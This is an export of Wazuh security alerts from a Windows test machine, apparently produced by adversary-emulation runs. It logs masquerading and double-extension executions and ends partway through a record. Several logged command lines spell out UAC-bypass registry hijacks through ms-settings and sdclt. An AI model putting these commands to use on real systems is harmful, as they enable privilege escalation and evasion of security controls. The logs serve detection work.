  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "QkfPOZkBIDwfn7_zqarl",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "Cmd.Exe",
            "image": "C:\\\\lsm.exe",
            "product": "Microsoft® Windows® Operating System",
            "parentProcessGuid": "{994437b3-0604-68c3-ab27-000000000e00}",
            "description": "Windows Command Processor",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "cmd.exe /C copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\lsm.exe &amp;&amp; C:\\\\lsm.exe /c echo T1036.003 &gt; C:\\\\T1036.003.txt",
            "processGuid": "{994437b3-0604-68c3-ac27-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "10800",
            "processId": "5880",
            "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
            "utcTime": "2025-09-11 17:25:24.057",
            "hashes": "MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
            "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "company": "Microsoft Corporation",
            "commandLine": "C:\\\\lsm.exe  /c echo T1036.003",
            "integrityLevel": "High",
            "fileVersion": "10.0.22621.608 (WinBuild.160101.0800)",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:25:24.057\r\nProcessGuid: {994437b3-0604-68c3-ac27-000000000e00}\r\nProcessId: 5880\r\nImage: C:\\lsm.exe\r\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\lsm.exe  /c echo T1036.003 \r\nCurrentDirectory: C:\\Windows\\System32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\r\nParentProcessGuid: {994437b3-0604-68c3-ab27-000000000e00}\r\nParentProcessId: 10800\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe /C copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe && C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:25:24.0682360Z",
            "eventRecordID": "9913",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 1,
        "mail": true,
        "level": 12,
        "pci_dss": [
          "10.6.1",
          "11.4"
        ],
        "hipaa": [
          "164.312.b"
        ],
        "tsc": [
          "CC7.2",
          "CC7.3",
          "CC6.1",
          "CC6.8"
        ],
        "description": "Sysmon - Suspicious Process - lsm.exe",
        "groups": [
          "windows",
          "sysmon",
          "sysmon_process-anomalies"
        ],
        "mitre": {
          "technique": [
            "Process Injection"
          ],
          "id": [
            "T1055"
          ],
          "tactic": [
            "Defense Evasion",
            "Privilege Escalation"
          ]
        },
        "id": "61620",
        "nist_800_53": [
          "AU.6",
          "SI.4"
        ],
        "gdpr": [
          "IV_35.7.d"
        ]
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611525.1549468",
      "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2025-09-11T17:25:24.0682360Z\",\"eventRecordID\":\"9913\",\"processID\":\"3544\",\"threadID\":\"4804\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"DESKTOP-MDNNEJF\",\"severityValue\":\"INFORMATION\",\"message\":\"\\\"Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 2025-09-11 17:25:24.057\\r\\nProcessGuid: {994437b3-0604-68c3-ac27-000000000e00}\\r\\nProcessId: 5880\\r\\nImage: C:\\\\lsm.exe\\r\\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\\r\\nDescription: Windows Command Processor\\r\\nProduct: Microsoft® Windows® Operating System\\r\\nCompany: Microsoft Corporation\\r\\nOriginalFileName: Cmd.Exe\\r\\nCommandLine: C:\\\\lsm.exe  /c echo T1036.003 \\r\\nCurrentDirectory: C:\\\\Windows\\\\System32\\\\\\r\\nUser: DESKTOP-MDNNEJF\\\\env-admin\\r\\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\\r\\nLogonId: 0x7E095\\r\\nTerminalSessionId: 1\\r\\nIntegrityLevel: High\\r\\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\\r\\nParentProcessGuid: {994437b3-0604-68c3-ab27-000000000e00}\\r\\nParentProcessId: 10800\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: cmd.exe /C copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\lsm.exe && C:\\\\lsm.exe /c echo T1036.003 > C:\\\\T1036.003.txt\\r\\nParentUser: DESKTOP-MDNNEJF\\\\env-admin\\\"\"},\"eventdata\":{\"utcTime\":\"2025-09-11 17:25:24.057\",\"processGuid\":\"{994437b3-0604-68c3-ac27-000000000e00}\",\"processId\":\"5880\",\"image\":\"C:\\\\\\\\lsm.exe\",\"fileVersion\":\"10.0.22621.608 (WinBuild.160101.0800)\",\"description\":\"Windows Command Processor\",\"product\":\"Microsoft® Windows® Operating System\",\"company\":\"Microsoft Corporation\",\"originalFileName\":\"Cmd.Exe\",\"commandLine\":\"C:\\\\\\\\lsm.exe  /c echo T1036.003\",\"currentDirectory\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\\",\"user\":\"DESKTOP-MDNNEJF\\\\\\\\env-admin\",\"logonGuid\":\"{994437b3-7451-68b8-95e0-070000000000}\",\"logonId\":\"0x7e095\",\"terminalSessionId\":\"1\",\"integrityLevel\":\"High\",\"hashes\":\"MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\",\"parentProcessGuid\":\"{994437b3-0604-68c3-ab27-000000000e00}\",\"parentProcessId\":\"10800\",\"parentImage\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /C copy C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe C:\\\\\\\\lsm.exe &amp;&amp; C:\\\\\\\\lsm.exe /c echo T1036.003 &gt; C:\\\\\\\\T1036.003.txt\",\"parentUser\":\"DESKTOP-MDNNEJF\\\\\\\\env-admin\"}}}",
      "timestamp": "2025-09-11T17:25:25.132+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:25:25.132Z"
      ]
    },
    "sort": [
      1757611525132
    ]
  },


  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "skf0OZkBIDwfn7_zdKrD",
    "_score": null,
    "_source": {
      "syscheck": {
        "mode": "scheduled",
        "path": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "value_type": "REG_SZ",
        "sha1_after": "7647917caebd9ee2a1c98925b62733b820d465a0",
        "size_after": "162",
        "arch": "[x64]",
        "event": "added",
        "md5_after": "1cca22d07dd42056fb211bc676e4acc3",
        "sha256_after": "f3f9f7b5d68bf99157dc44df8b809da9d6ba23d1c61223b4a82f6a1b26daed84",
        "value_name": "NextRun"
      },
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "rule": {
        "mail": false,
        "level": 5,
        "pci_dss": [
          "11.5"
        ],
        "hipaa": [
          "164.312.c.1",
          "164.312.c.2"
        ],
        "tsc": [
          "PI1.4",
          "PI1.5",
          "CC6.1",
          "CC6.8",
          "CC7.2",
          "CC7.3"
        ],
        "description": "Registry Value Entry Added to the System",
        "groups": [
          "ossec",
          "syscheck",
          "syscheck_entry_added",
          "syscheck_registry"
        ],
        "nist_800_53": [
          "SI.7"
        ],
        "gdpr": [
          "II_5.1.f"
        ],
        "firedtimes": 7,
        "mitre": {
          "technique": [
            "Modify Registry"
          ],
          "id": [
            "T1112"
          ],
          "tactic": [
            "Defense Evasion"
          ]
        },
        "id": "752",
        "gpg13": [
          "4.13"
        ]
      },
      "location": "syscheck",
      "decoder": {
        "name": "syscheck_registry_value_added"
      },
      "id": "1757613944.1876416",
      "full_log": "Registry Value '[x64] HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun' added\nMode: scheduled\n",
      "timestamp": "2025-09-11T18:05:44.834+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T18:05:44.834Z"
      ]
    },
    "sort": [
      1757613944834
    ]
  },

  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "PEfOOZkBIDwfn7_zrqon",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "wscript.exe",
            "image": "C:\\\\Windows\\\\System32\\\\wscript.exe",
            "product": "Microsoft ® Windows Script Host",
            "parentProcessGuid": "{994437b3-05c8-68c3-9e27-000000000e00}",
            "description": "Microsoft ® Windows Based Script Host",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "cmd.exe /C copy \\\"C:\\\\Windows\\\\System32\\\\calc.exe\\\" %temp%\\\\T1036.007_masquerading.docx.exe /Y &amp;&amp; copy \\\"C:\\\\Windows\\\\System32\\\\calc.exe\\\" %temp%\\\\T1036.007_masquerading.pdf.exe /Y &amp;&amp; copy \\\"C:\\\\Windows\\\\System32\\\\calc.exe\\\" %temp%\\\\T1036.007_masquerading.ps1.exe /Y &amp;&amp; copy \\\"4bd145_T1036.007_masquerading.vbs\\\" %temp%\\\\T1036.007_masquerading.xls.vbs /Y &amp;&amp; copy \\\"4bd145_T1036.007_masquerading.vbs\\\" %temp%\\\\T1036.007_masquerading.xlsx.vbs /Y &amp;&amp; copy \\\"4bd145_T1036.007_masquerading.vbs\\\" %temp%\\\\T1036.007_masquerading.png.vbs /Y &amp;&amp; copy \\\"107417_T1036.007_masquerading.ps1\\\" %temp%\\\\T1036.007_masquerading.doc.ps1 /Y &amp;&amp; copy \\\"107417_T1036.007_masquerading.ps1\\\" %temp%\\\\T1036.007_masquerading.pdf.ps1 /Y &amp;&amp; copy \\\"107417_T1036.007_masquerading.ps1\\\" %temp%\\\\T1036.007_masquerading.rtf.ps1 /Y &amp;&amp; %temp%\\\\T1036.007_masquerading.docx.exe &amp;&amp; %temp%\\\\T1036.007_masquerading.pdf.exe &amp;&amp; %temp%\\\\T1036.007_masquerading.ps1.exe &amp;&amp; %temp%\\\\T1036.007_masquerading.xls.vbs &amp;&amp; %temp%\\\\T1036.007_masquerading.xlsx.vbs &amp;&amp; %temp%\\\\T1036.007_masquerading.png.vbs &amp;&amp; C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -File %temp%\\\\T1036.007_masquerading.doc.ps1 &amp;&amp; C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -File %temp%\\\\T1036.007_masquerading.pdf.ps1 &amp;&amp; C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -File %temp%\\\\T1036.007_masquerading.rtf.ps1",
            "processGuid": "{994437b3-05cb-68c3-a927-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "8084",
            "processId": "11224",
            "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
            "utcTime": "2025-09-11 17:24:27.215",
            "hashes": "MD5=B81E7B35DB616A29A2F3C1DB9CEC90A7,SHA256=D4F298D6BAB0963EAA669CB43A3E3F61834BB6CA1A8D08A059B70731C3B4476B,IMPHASH=ACD7356FA52D4E2866A873BF9AB94256",
            "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "company": "Microsoft Corporation",
            "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\WScript.exe\\\" \\\"C:\\\\Users\\\\ENV-AD~1\\\\AppData\\\\Local\\\\Temp\\\\T1036.007_masquerading.png.vbs\\\"",
            "integrityLevel": "High",
            "fileVersion": "5.812.10240.16384",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:24:27.215\r\nProcessGuid: {994437b3-05cb-68c3-a927-000000000e00}\r\nProcessId: 11224\r\nImage: C:\\Windows\\System32\\wscript.exe\r\nFileVersion: 5.812.10240.16384\r\nDescription: Microsoft ® Windows Based Script Host\r\nProduct: Microsoft ® Windows Script Host\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wscript.exe\r\nCommandLine: \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\ENV-AD~1\\AppData\\Local\\Temp\\T1036.007_masquerading.png.vbs\"  \r\nCurrentDirectory: C:\\Windows\\System32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=B81E7B35DB616A29A2F3C1DB9CEC90A7,SHA256=D4F298D6BAB0963EAA669CB43A3E3F61834BB6CA1A8D08A059B70731C3B4476B,IMPHASH=ACD7356FA52D4E2866A873BF9AB94256\r\nParentProcessGuid: {994437b3-05c8-68c3-9e27-000000000e00}\r\nParentProcessId: 8084\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe /C copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.007_masquerading.docx.exe /Y && copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.007_masquerading.pdf.exe /Y && copy \"C:\\Windows\\System32\\calc.exe\" %temp%\\T1036.007_masquerading.ps1.exe /Y && copy \"4bd145_T1036.007_masquerading.vbs\" %temp%\\T1036.007_masquerading.xls.vbs /Y && copy \"4bd145_T1036.007_masquerading.vbs\" %temp%\\T1036.007_masquerading.xlsx.vbs /Y && copy \"4bd145_T1036.007_masquerading.vbs\" %temp%\\T1036.007_masquerading.png.vbs /Y && copy \"107417_T1036.007_masquerading.ps1\" %temp%\\T1036.007_masquerading.doc.ps1 /Y && copy \"107417_T1036.007_masquerading.ps1\" %temp%\\T1036.007_masquerading.pdf.ps1 /Y && copy \"107417_T1036.007_masquerading.ps1\" %temp%\\T1036.007_masquerading.rtf.ps1 /Y && %temp%\\T1036.007_masquerading.docx.exe && %temp%\\T1036.007_masquerading.pdf.exe && %temp%\\T1036.007_masquerading.ps1.exe && %temp%\\T1036.007_masquerading.xls.vbs && %temp%\\T1036.007_masquerading.xlsx.vbs && %temp%\\T1036.007_masquerading.png.vbs && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.doc.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.pdf.ps1 && C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.rtf.ps1\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:24:27.2168526Z",
            "eventRecordID": "9908",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 4,
        "mail": false,
        "level": 4,
        "description": "Command shell started script with /c modifier",
        "groups": [
          "sysmon",
          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Command and Scripting Interpreter"
          ],
          "id": [
            "T1059"
          ],
          "tactic": [
            "Execution"
          ]
        },
        "id": "92005"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611467.1517244",
      "timestamp": "2025-09-11T17:24:27.976+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:24:27.976Z"
      ]
    },
    "sort": [
      1757611467976
    ]
  },



  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "KkfOOZkBIDwfn7_zrqon",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "image": "C:\\\\Users\\\\Public\\\\splunkd.exe",
            "processGuid": "{994437b3-f6cf-68c2-1627-000000000e00}",
            "processId": "10580",
            "utcTime": "2025-09-11 17:24:24.004",
            "targetFilename": "C:\\\\Windows\\\\System32\\\\4bd145_T1036.007_masquerading.vbs",
            "creationUtcTime": "2025-09-11 17:24:24.003",
            "user": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "11",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:24:24.004\r\nProcessGuid: {994437b3-f6cf-68c2-1627-000000000e00}\r\nProcessId: 10580\r\nImage: C:\\Users\\Public\\splunkd.exe\r\nTargetFilename: C:\\Windows\\System32\\4bd145_T1036.007_masquerading.vbs\r\nCreationUtcTime: 2025-09-11 17:24:24.003\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "2",
            "systemTime": "2025-09-11T17:24:24.0053098Z",
            "eventRecordID": "9888",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "11",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 3,
        "mail": false,
        "level": 6,
        "description": "Executable dropped in Windows root folder",
        "groups": [
          "sysmon",
          "sysmon_eid11_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Lateral Tool Transfer"
          ],
          "id": [
            "T1570"
          ],
          "tactic": [
            "Lateral Movement"
          ]
        },
        "id": "92217"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611465.1409874",
      "timestamp": "2025-09-11T17:24:25.058+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:24:25.058Z"
      ]
    },
    "sort": [
      1757611465058
    ]
  },




  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "J0fNOZkBIDwfn7_zraql",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "sdclt.exe",
            "image": "C:\\\\Windows\\\\System32\\\\sdclt.exe",
            "product": "Microsoft® Windows® Operating System",
            "parentProcessGuid": "{994437b3-0585-68c3-9527-000000000e00}",
            "description": "Microsoft® Windows Backup",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"New-Item -Force -Path \\\\\\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\\\\\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \\\\\\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\\\\\" -Name \\\\\\\"DelegateExecute\\\\\\\"; Start-Process -FilePath $env:windir\\\\system32\\\\sdclt.exe; Start-Sleep -s 3\\\"",
            "processGuid": "{994437b3-0586-68c3-9627-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "10056",
            "processId": "1404",
            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
            "utcTime": "2025-09-11 17:23:18.790",
            "hashes": "MD5=C9412AF4B872D2960A16AEE1888EB54A,SHA256=40E1F610B7ACFF688D1BF3831163523C70730040C0A75125EF874E5B25D51710,IMPHASH=EDF550737353E87059956C9155EED6F1",
            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "company": "Microsoft Corporation",
            "commandLine": "\\\"C:\\\\Windows\\\\system32\\\\sdclt.exe\\\"",
            "integrityLevel": "High",
            "fileVersion": "10.0.22621.608 (WinBuild.160101.0800)",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:23:18.790\r\nProcessGuid: {994437b3-0586-68c3-9627-000000000e00}\r\nProcessId: 1404\r\nImage: C:\\Windows\\System32\\sdclt.exe\r\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\r\nDescription: Microsoft® Windows Backup\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: sdclt.exe\r\nCommandLine: \"C:\\Windows\\system32\\sdclt.exe\" \r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=C9412AF4B872D2960A16AEE1888EB54A,SHA256=40E1F610B7ACFF688D1BF3831163523C70730040C0A75125EF874E5B25D51710,IMPHASH=EDF550737353E87059956C9155EED6F1\r\nParentProcessGuid: {994437b3-0585-68c3-9527-000000000e00}\r\nParentProcessId: 10056\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"New-Item -Force -Path \\\"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\\\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \\\"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\\\" -Name \\\"DelegateExecute\\\"; Start-Process -FilePath $env:windir\\system32\\sdclt.exe; Start-Sleep -s 3\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
            "version": "5",
            "systemTime": "2025-09-11T17:23:18.8117752Z",
            "eventRecordID": "9874",
            "threadID": "4804",
            "computer": "DESKTOP-MDNNEJF",
            "task": "1",
            "processID": "3544",
            "severityValue": "INFORMATION",
            "providerName": "Microsoft-Windows-Sysmon"
          }
        }
      },
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "Windows backup and restore tool sdclt.exe launched via C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe with High integrity level",
        "groups": [
          "sysmon",
          "sysmon_eid1_detections",
          "windows"
        ],
        "mitre": {
          "technique": [
            "Abuse Elevation Control Mechanism",
            "Windows Command Shell"
          ],
          "id": [
            "T1548",
            "T1059.003"
          ],
          "tactic": [
            "Privilege Escalation",
            "Defense Evasion",
            "Execution"
          ]
        },
        "id": "92061"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "id": "1757611399.1392111",
      "timestamp": "2025-09-11T17:23:19.057+0000"
    },
    "fields": {
      "timestamp": [
        "2025-09-11T17:23:19.057Z"
      ]
    },
    "sort": [
      1757611399057
    ]
  },



  {
    "_index": "wazuh-alerts-4.x-2025.09.11",
    "_id": "FUfKOZkBIDwfn7_zeapn",
    "_score": null,
    "_source": {
      "input": {
        "type": "log"
      },
      "agent": {
        "ip": "192.168.1.101",
        "name": "DESKTOP-MDNNEJF",
        "id": "001"
      },
      "manager": {
        "name": "ubuntu22"
      },
      "data": {
        "win": {
          "eventdata": {
            "originalFileName": "ComputerDefaults.EXE",
            "image": "C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe",
            "product": "Microsoft® Windows® Operating System",
            "parentProcessGuid": "{994437b3-04b0-68c3-8727-000000000e00}",
            "description": "Set Program Access and Computer Defaults Control Panel",
            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"New-Item \\\\\\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\\" -Force; New-ItemProperty \\\\\\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\\" -Name \\\\\\\"DelegateExecute\\\\\\\" -Value \\\\\\\"\\\\\\\" -Force; Set-ItemProperty \\\\\\\"HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\\" -Name \\\\\\\"(default)\\\\\\\" -Value \\\\\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\\\\\" -Force; Start-Process \\\\\\\"C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe\\\\\\\"\\\"",
            "processGuid": "{994437b3-04b1-68c3-8827-000000000e00}",
            "logonId": "0x7e095",
            "parentProcessId": "4588",
            "processId": "7908",
            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
            "utcTime": "2025-09-11 17:19:45.544",
            "hashes": "MD5=175A95425DE8269C867B6C2C46A9785C,SHA256=62F175FB6C679AB74D4E8743DE5DE014AB2181E4EBDF0008EC4B6C2C5F22E729,IMPHASH=F80FC6EF610CC28E0F47123BDB00C150",
            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
            "company": "Microsoft Corporation",
            "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\ComputerDefaults.exe\\\"",
            "integrityLevel": "High",
            "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
            "user": "DESKTOP-MDNNEJF\\\\env-admin",
            "terminalSessionId": "1",
            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
          },
          "system": {
            "eventID": "1",
            "keywords": "0x8000000000000000",
            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
            "level": "4",
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "opcode": "0",
